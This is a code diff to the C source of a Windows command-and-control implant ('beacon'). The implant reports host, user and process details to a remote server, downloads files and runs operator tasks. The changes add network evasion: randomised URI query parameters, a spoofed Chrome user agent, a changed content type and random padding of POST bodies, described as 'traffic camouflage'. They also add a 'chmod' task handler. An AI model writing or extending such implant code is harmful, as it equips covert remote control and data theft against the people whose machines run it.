@@ -191,6 +191,9 @@ static void dbglog(const char *tag, const char *data, int datalen) {
 #endif
 }
 
+/* Padded POST body (8-byte BE length plus jitter); defined below. */
+static char *pad_body(const char *body, DWORD bodylen, DWORD *outlen);
+
 static char *http_post(const char *body, DWORD bodylen, DWORD *outlen) {
     HINTERNET hSess = NULL, hConn = NULL, hReq = NULL;
     char *resp = NULL;
@@ -198,9 +201,29 @@ static char *http_post(const char *body, DWORD bodylen, DWORD *outlen) {
     wchar_t whost[256], wpath[256];
     MultiByteToWideChar(CP_UTF8, 0, C2_HOST, -1, whost, 256);
     MultiByteToWideChar(CP_UTF8, 0, BEACON_PATH, -1, wpath, 256);
+    /* URI jitter: ?<6 letters>=<12 hex> per beacon (Go jitterQueryPair
+     * parity). Profile URIs may already carry a query: extend with &. */
+    {
+        BYTE r[6];
+        int i;
+        static const wchar_t hexd[] = L"0123456789abcdef";
+        if (cng_random(r, sizeof(r)) == 0) {
+            size_t wl = wcslen(wpath);
+            if (wl + 21 < 256) {
+                wpath[wl++] = wcschr(wpath, L'?') ? L'&' : L'?';
+                for (i = 0; i < 6; i++) wpath[wl++] = (wchar_t)(L'a' + (r[i] % 26));
+                wpath[wl++] = L'=';
+                for (i = 0; i < 6; i++) {
+                    wpath[wl++] = hexd[(r[i] >> 4) & 15];
+                    wpath[wl++] = hexd[r[i] & 15];
+                }
+                wpath[wl] = L'\0';
+            }
+        }
+    }
     resp = (char *)malloc(cap);
     if (!resp) return NULL;
-    hSess = WinHttpOpen(L"FC2-C/0.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+    hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSess) goto done;
     hConn = WinHttpConnect(hSess, whost, (INTERNET_PORT)C2_PORT, 0);
@@ -209,10 +232,17 @@ static char *http_post(const char *body, DWORD bodylen, DWORD *outlen) {
                               WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!hReq) goto done;
     {
-        wchar_t hdrs[] = L"Content-Type: application/json\r\n";
+        wchar_t hdrs[] = L"Content-Type: text/plain;charset=UTF-8\r\n";
         DWORD hlen = (DWORD)-1L;
-        if (!WinHttpSendRequest(hReq, hdrs, hlen, (LPVOID)body, bodylen,
-                                bodylen, 0)) goto done;
+                DWORD sendlen = bodylen;
+        char *sendbuf = pad_body(body, bodylen, &sendlen);
+        BOOL sent;
+        if (!sendbuf) goto done;
+        sent = WinHttpSendRequest(hReq, hdrs, hlen, (LPVOID)sendbuf, sendlen,
+                                  sendlen, 0);
+        cng_wipe(sendbuf, sendlen);
+        free(sendbuf);
+        if (!sent) goto done;
         if (!WinHttpReceiveResponse(hReq, NULL)) goto done;
         for (;;) {
             if (!WinHttpQueryDataAvailable(hReq, &avail)) goto done;
@@ -249,6 +279,35 @@ done2:
 static void put_be64(BYTE out[8], unsigned long long v) {
     int i;
     for (i = 0; i < 8; i++) out[7 - i] = (BYTE)(v >> (8 * i));
+}
+
+/* Forward declaration (defined below, used by pad_body). */
+static void put_be64(BYTE out[8], unsigned long long v);
+
+/* Traffic camouflage (mirrors Go ContentLengthJitter=512 + JitterURI=true):
+ * pad every POST body with an 8-byte BE length prefix plus up to
+ * CONTENT_JITTER_MAX random bytes (server stripBodyPadding removes it;
+ * short bodies pass through untouched, so old servers still accept it).
+ * Compile-time overridable: -DCONTENT_JITTER_MAX=0 disables padding. */
+#ifndef CONTENT_JITTER_MAX
+#define CONTENT_JITTER_MAX 512
+#endif
+static char *pad_body(const char *body, DWORD bodylen, DWORD *outlen) {
+    BYTE rnd[8];
+    DWORD pad = 0;
+    char *out;
+    if (CONTENT_JITTER_MAX > 0 && cng_random(rnd, sizeof(rnd)) == 0)
+        pad = ((unsigned)rnd[0] | ((unsigned)rnd[1] << 8)) % (CONTENT_JITTER_MAX + 1);
+    out = (char *)malloc((size_t)bodylen + 8 + pad);
+    if (!out) return NULL;
+    put_be64((BYTE *)out, bodylen);
+    memcpy(out + 8, body, bodylen);
+    if (pad) {
+        if (cng_random((BYTE *)(out + 8 + bodylen), pad) != 0)
+            memset(out + 8 + bodylen, 0, pad);
+    }
+    *outlen = bodylen + 8 + pad;
+    return out;
 }
 
 /* reg_hmac = b64(HMAC(regKey, uuid||idpub_b64||ts_be64||seq_be64)) */
@@ -716,7 +775,7 @@ static char *build_info_json(void) {
             "\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows\","
             "\"arch\":\"amd64\",\"implant\":\"c\",\"encoding\":\"base64\","
             "\"pid\":\"%lu\",\"process_name\":\"%s\","
-            "\"interval\":\"%d\",\"jitter\":\"%d\",\"version\":\"c-0.2\"",
+            "\"interval\":\"%d\",\"jitter\":\"%d\",\"version\":\"c-0.3\"",
             hb64, ub64, (unsigned long)pid, pname[0] ? pname : "cbeacon.exe",
             g_interval, g_jitter);
     }
@@ -1073,7 +1132,7 @@ static int download_url_to_file(const char *url, const char *dest,
         if (err) strcpy_s(err, errcap, "only http(s) supported");
         return -1;
     }
-    hs = WinHttpOpen(L"FC2-C/0.1", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+    hs = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                       WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hs) goto done;
     hc = WinHttpConnect(hs, whost, uc.nPort, 0);
@@ -1856,6 +1915,37 @@ int main(void) {
                                                     char msg[1024]; _snprintf(msg, sizeof(msg), "delete %s failed (%lu)", pp, GetLastError());
                                                     robj = emit_error_result(t.id, "delete", msg, rid);
                                                 }
+} else if (strcmp(t.type, "chmod") == 0) {
+    const char *pp = (t.path && t.path[0]) ? t.path : t.command;
+    const char *ms0 = (t.data && t.data[0]) ? t.data : t.shell;
+    const char *ms = ms0;
+    if (!pp || !pp[0] || !ms || !ms[0]) {
+        robj = emit_error_result(t.id, "chmod", "chmod: path (command) and octal mode (data) are required", rid);
+    } else {
+        char *end = NULL;
+        unsigned long mv;
+        if (ms[0] == '0' && (ms[1] == 'o' || ms[1] == 'O')) ms += 2;
+        mv = strtoul(ms, &end, 8);
+        if (!end || *end || mv > 07777) {
+            char msg[256]; _snprintf(msg, sizeof(msg), "chmod: invalid octal mode \"%s\"", ms0);
+            robj = emit_error_result(t.id, "chmod", msg, rid);
+        } else {
+            DWORD attr = GetFileAttributesA(pp);
+            if (attr == INVALID_FILE_ATTRIBUTES) {
+                char msg[1024]; _snprintf(msg, sizeof(msg), "chmod %s failed: cannot stat (%lu)", pp, GetLastError());
+                robj = emit_error_result(t.id, "chmod", msg, rid);
+            } else {
+                DWORD nattr = (mv & 0222) ? (attr & ~FILE_ATTRIBUTE_READONLY) : (attr | FILE_ATTRIBUTE_READONLY);
+                if (nattr == attr || SetFileAttributesA(pp, nattr)) {
+                    char msg[2048]; _snprintf(msg, sizeof(msg), "set mode %s on %s", ms0, pp);
+                    robj = emit_text_result(t.id, "chmod", msg, rid);
+                } else {
+                    char msg[1024]; _snprintf(msg, sizeof(msg), "chmod %s failed (%lu)", pp, GetLastError());
+                    robj = emit_error_result(t.id, "chmod", msg, rid);
+                }
+            }
+        }
+    }
 } else {
                                                 char msg[128];
                                                 _snprintf(msg, sizeof(msg), "unsupported in C implant: %s", t.type);
